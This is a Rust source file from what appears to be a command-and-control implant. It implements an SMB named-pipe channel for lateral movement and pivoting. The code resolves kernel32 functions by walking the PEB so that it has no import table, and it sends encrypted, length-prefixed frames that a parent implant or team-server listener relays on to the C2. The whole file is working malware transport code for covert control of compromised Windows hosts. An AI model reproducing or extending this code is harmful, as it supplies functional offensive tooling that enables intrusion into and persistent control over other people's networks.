//! SMB Named Pipe channel — internal lateral / P2P pivot transport.
//!
//! Opens a Windows named pipe (`\\.\pipe\<name>`) with `CreateFileW`, writes the
//! encrypted frame with a 4-byte LE length prefix, reads the length-prefixed
//! response, and closes the handle. The pipe server (a parent implant acting as
//! a pivot, or the team server's SMB listener) reads the frame, relays it to the
//! real C2, and writes the reply back.
//!
//! ## Wire format
//!
//! Matches `crates/transport/src/smb_pipe.rs` (the dev/std reference):
//! - 4-byte little-endian payload length prefix
//! - payload bytes
//!
//! Both directions (request and response) use the same prefix.
//!
//! ## PIC constraints
//!
//! `#![no_std]` + no IAT: kernel32 functions are resolved by PEB walk via
//! [`crate::resolve::export_addr`]. There is no `extern "system"` block — all
//! calls go through `transmute`'d function pointers, exactly like `transport.rs`
//! resolves WinHTTP. `kernel32.dll` is always resident (the process loader maps
//! it before any user code runs), so no `LoadLibraryA` is needed.
//!
//! ## Synchronous I/O
//!
//! `CreateFileW` is called with no `FILE_FLAG_OVERLAPPED`, so `WriteFile`/
//! `ReadFile` block until the server side completes. This matches the reference
//! transport's synchronous mode and avoids the OVERLAPPED-event complexity that
//! would be unsafe under a bump allocator with no Drop glue for handles.

#![cfg(target_os = "windows")]

use crate::heap::{vec, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;
use super::ChannelCtx;

// ── Win32 constants ────────────────────────────────────────────────────────

/// `GENERIC_READ` access right (winnt.h).
const GENERIC_READ: u32 = 0x8000_0000;
/// `GENERIC_WRITE` access right (winnt.h).
const GENERIC_WRITE: u32 = 0x4000_0000;
/// `OPEN_EXISTING` creation disposition — required for named-pipe clients.
const OPEN_EXISTING: u32 = 3;
/// `INVALID_HANDLE_VALUE` as a raw pointer. CreateFileW returns this on failure.
const INVALID_HANDLE: *mut c_void = !0usize as *mut c_void;
/// Pipe not-available transient error (server still spawning the instance).
/// The client treats this as a soft failure (return None → beacon retry).
#[allow(dead_code)]
const ERROR_PIPE_BUSY: u32 = 231;

/// Maximum total frame size (payload) the channel will accept on read. Caps the
/// bump-allocator pressure a malicious/buggy pipe server can impose by sending a
/// huge length prefix. 1 MiB matches the reference transport's MAX_FRAME.
const MAX_FRAME: usize = 1024 * 1024;

// ── kernel32 function pointer types ────────────────────────────────────────

type Handle = *mut c_void;

type FCreateFileW = unsafe extern "system" fn(
    lp_file_name: *const u16,
    dw_desired_access: u32,
    dw_share_mode: u32,
    lp_security_attributes: *const c_void,
    dw_creation_disposition: u32,
    dw_flags_and_attributes: u32,
    h_template_file: Handle,
) -> Handle;

type FWriteFile = unsafe extern "system" fn(
    h_file: Handle,
    lp_buffer: *const u8,
    n_number_of_bytes_to_write: u32,
    lp_number_of_bytes_written: *mut u32,
    lp_overlapped: *const c_void,
) -> i32;

type FReadFile = unsafe extern "system" fn(
    h_file: Handle,
    lp_buffer: *mut u8,
    n_number_of_bytes_to_read: u32,
    lp_number_of_bytes_read: *mut u32,
    lp_overlapped: *const c_void,
) -> i32;

type FCloseHandle = unsafe extern "system" fn(h_object: Handle) -> i32;

/// Resolved kernel32 function table (cached after first resolution).
struct K32Fns {
    create_file_w: FCreateFileW,
    write_file: FWriteFile,
    read_file: FReadFile,
    close_handle: FCloseHandle,
}

/// kernel32 function table, stored as a raw pointer. 0 = uninitialized,
/// 1 = init failed, otherwise = pointer to a leaked `K32Fns`.
static K32: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// Resolve the kernel32 function table once via PEB walk. `kernel32.dll` is
/// always loaded by the loader, so `export_addr` finds it without
/// `LoadLibraryA`. Idempotent: the `DONE` flag makes repeat calls no-ops.
unsafe fn ensure_k32() -> bool {
    use core::sync::atomic::Ordering;
    // Fast path: already attempted.
    let cur = K32.load(Ordering::Acquire);
    if cur != 0 {
        return cur > 1;
    }
    let cf = export_addr(b"kernel32.dll", b"CreateFileW");
    let wf = export_addr(b"kernel32.dll", b"WriteFile");
    let rf = export_addr(b"kernel32.dll", b"ReadFile");
    let ch = export_addr(b"kernel32.dll", b"CloseHandle");
    if let (Some(cf), Some(wf), Some(rf), Some(ch)) = (cf, wf, rf, ch) {
        // SAFETY: function pointer transmute. The PEB-walk export resolution
        // returns the absolute address of the named export; transmuting to the
        // matching `extern "system"` signature is sound because the Win32 ABI
        // is exactly that signature. Mirrors transport.rs's WinHTTP resolution.
        let fns = alloc::boxed::Box::new(K32Fns {
            create_file_w: core::mem::transmute(cf),
            write_file: core::mem::transmute(wf),
            read_file: core::mem::transmute(rf),
            close_handle: core::mem::transmute(ch),
        });
        let ptr = alloc::boxed::Box::into_raw(fns) as usize;
        match K32.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
            Ok(_) => return true,
            Err(_) => {
                drop(alloc::boxed::Box::from_raw(ptr as *mut K32Fns));
                // Race winner already stored; return their result.
                return K32.load(Ordering::Acquire) > 1;
            }
        }
    }
    // Export resolution failed.
    let _ = K32.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
    false
}
/// Convert an ASCII byte slice to a null-terminated UTF-16 buffer (Windows wide
/// string). Named-pipe paths are ASCII (`\\.\pipe\...`), so zero-extending each
/// byte is sufficient (same approach as `transport::to_utf16`).
fn to_utf16(s: &[u8]) -> Vec<u16> {
    let mut v = Vec::with_capacity(s.len() + 1);
    for &b in s {
        v.push(b as u16);
    }
    v.push(0);
    v
}

/// Send `frame` over the configured named pipe and return the server's response
/// frame, or `None` on any failure (pipe missing, write/read error, oversize
/// response). Each call opens, transacts, and closes the pipe — stateless, so a
/// crashed pivot pipe is recovered on the next beacon cycle without reconnect
/// bookkeeping.
///
/// Wire format: 4-byte LE length prefix + payload, both directions.
///
/// # Safety
/// Resolves and invokes kernel32 function pointers via PEB walk; all pointer
/// arguments point into the implant's own stack/heap buffers.
pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    // No pipe configured → channel unavailable (operator hasn't issued
    // SetChannel with an SMB pipe name). Bail cleanly so the dispatcher falls
    // through to the next fallback channel.
    if ctx.smb_pipe_name.is_empty() {
        crate::entry::diag_mark(b"ERR_CH_SMB_NOPIPE");
        return None;
    }
    if !unsafe { ensure_k32() } {
        // kernel32 exports couldn't be resolved — should never happen (kernel32
        // is always resident), but defend in depth rather than deref a null fn
        // pointer.
        crate::entry::diag_mark(b"ERR_CH_SMB_NOAPI");
        return None;
    }
    let ptr = K32.load(core::sync::atomic::Ordering::Acquire);
    if ptr <= 1 {
        return None;
    }
    // SAFETY: pointer was stored by ensure_k32 via Box::leak; process-lifetime.
    let fns = unsafe { &*(ptr as *const K32Fns) };
    let close = fns.close_handle;

    // ---- Open the named pipe ----
    let wide = to_utf16(ctx.smb_pipe_name.as_bytes());
    let handle = unsafe {
        (fns.create_file_w)(
            wide.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0, // dwShareMode = 0 (exclusive)
            core::ptr::null(),
            OPEN_EXISTING,
            0, // synchronous I/O (no FILE_FLAG_OVERLAPPED)
            core::ptr::null_mut(),
        )
    };
    if handle == INVALID_HANDLE || handle.is_null() {
        // Pipe not present / not listening yet → transient: the beacon loop will
        // retry next cycle. (Common during pivot bring-up.)
        crate::entry::diag_mark(b"ERR_CH_SMB_OPEN");
        return None;
    }

    // Guard: ensure the handle is closed on every return path below. We inline
    // the close before each `return` because the bump allocator has no Drop and
    // a RAII guard would need a closure-return pattern that's awkward in no_std.
    // (Same explicit-close discipline transport.rs uses for WinHTTP handles.)

    // ---- Write phase: [4-byte LE len][frame] ----
    let len = frame.len() as u32;
    let prefix = len.to_le_bytes();
    let mut sent_all = true;
    if !write_all(fns, handle, &prefix) {
        sent_all = false;
    }
    if sent_all && !write_all(fns, handle, frame) {
        sent_all = false;
    }
    if !sent_all {
        unsafe { close(handle) };
        crate::entry::diag_mark(b"ERR_CH_SMB_WRITE");
        return None;
    }

    // ---- Read phase: [4-byte LE len][payload] ----
    let mut prefix_buf = [0u8; 4];
    if !read_exact(fns, handle, &mut prefix_buf) {
        unsafe { close(handle) };
        crate::entry::diag_mark(b"ERR_CH_SMB_RDPREFIX");
        return None;
    }
    let payload_len = u32::from_le_bytes(prefix_buf) as usize;
    // Reject absurd length prefixes: a malicious/buggy pipe server could claim a
    // 4 GiB payload and exhaust the bump allocator (fixed virtual region). 1 MiB
    // matches the reference transport cap and is ample for any C2 task reply.
    if payload_len > MAX_FRAME {
        unsafe { close(handle) };
        crate::entry::diag_mark(b"ERR_CH_SMB_BIGRESP");
        return None;
    }

    let mut resp: Vec<u8> = vec![0u8; payload_len];
    let ok = if payload_len == 0 {
        true // zero-length payload is valid (e.g. empty task batch)
    } else {
        read_exact(fns, handle, &mut resp)
    };
    unsafe { close(handle) };
    if !ok {
        crate::entry::diag_mark(b"ERR_CH_SMB_RDPAYLOAD");
        return None;
    }
    if resp.is_empty() {
        None
    } else {
        Some(resp)
    }
}

/// Write the entirety of `buf` to the pipe, looping on partial writes. Returns
/// false on a WriteFile failure (return 0) — the caller closes the handle and
/// reports a transport error. Synchronous I/O means each WriteFile blocks until
/// the bytes are consumed by the server end of the pipe.
///
/// # Safety
/// `handle` must be a valid open pipe handle from CreateFileW.
unsafe fn write_all(fns: &K32Fns, handle: Handle, buf: &[u8]) -> bool {
    let mut total: usize = 0;
    while total < buf.len() {
        let mut written: u32 = 0;
        let remaining = buf.len() - total;
        // Cap each WriteFile at u32::MAX (WriteFile takes a u32 count). Frames
        // are ≤ 1 MiB so this is never hit in practice, but defend in depth.
        let chunk = remaining.min(u32::MAX as usize) as u32;
        let rc = unsafe {
            (fns.write_file)(
                handle,
                buf.as_ptr().add(total),
                chunk,
                &mut written,
                core::ptr::null(),
            )
        };
        if rc == 0 {
            return false;
        }
        // Defensive: a successful WriteFile that wrote 0 bytes would otherwise
        // spin this loop forever. Treat as failure.
        if written == 0 {
            return false;
        }
        total += written as usize;
    }
    true
}

/// Read exactly `buf.len()` bytes from the pipe, looping on partial reads.
/// Returns false on a ReadFile failure (return 0) or a clean EOF (bytes_read=0)
/// before `buf` is filled — either means the pipe server closed early, so the
/// caller treats the transaction as failed.
///
/// # Safety
/// `handle` must be a valid open pipe handle; `buf` must have room for the read.
unsafe fn read_exact(fns: &K32Fns, handle: Handle, buf: &mut [u8]) -> bool {
    let mut total: usize = 0;
    while total < buf.len() {
        let mut bytes_read: u32 = 0;
        let remaining = buf.len() - total;
        let chunk = remaining.min(u32::MAX as usize) as u32;
        let rc = unsafe {
            (fns.read_file)(
                handle,
                buf.as_mut_ptr().add(total),
                chunk,
                &mut bytes_read,
                core::ptr::null(),
            )
        };
        if rc == 0 || bytes_read == 0 {
            return false;
        }
        total += bytes_read as usize;
    }
    true
}
